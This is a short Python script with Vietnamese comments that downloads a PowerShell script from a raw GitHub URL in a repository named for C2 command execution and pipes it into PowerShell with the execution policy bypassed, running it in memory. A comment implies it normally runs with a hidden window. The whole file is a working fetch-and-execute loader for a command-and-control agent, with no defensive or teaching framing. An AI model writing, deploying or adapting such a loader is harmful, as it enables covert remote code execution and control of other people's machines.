import requests
import subprocess
import sys

def execute_in_memory(url):
    print(f"[*] Đang kết nối tới GitHub: {url}")
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            print(f"[-] Lỗi tải script: HTTP {response.status_code}")
            return
        
        ps_script = response.text
        print(f"[+] Đã tải script ({len(ps_script)} bytes). Đang nạp vào RAM...")

        # BỎ "-WindowStyle Hidden" khi debug để dễ quan sát nếu cần
        process = subprocess.Popen(
            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8'
        )

        print("[*] Đang thực thi lệnh PowerShell...")
        stdout, stderr = process.communicate(input=ps_script)

        if stdout:
            print(f"\n[OUTPUT FROM PS]:\n{stdout}")
        if stderr:
            print(f"\n[ERROR FROM PS]:\n{stderr}")
        
        print(f"[*] Tiến trình kết thúc với mã: {process.returncode}")

    except Exception as e:
        print(f"[-] Lỗi Python: {e}")

if __name__ == "__main__":
    # Đảm bảo link này là bản mới nhất bạn đã sửa
    GITHUB_RAW_URL = "https://raw.githubusercontent.com/thedarkassasin/Agent_C2_command_exec/main/ps.txt"
    execute_in_memory(GITHUB_RAW_URL)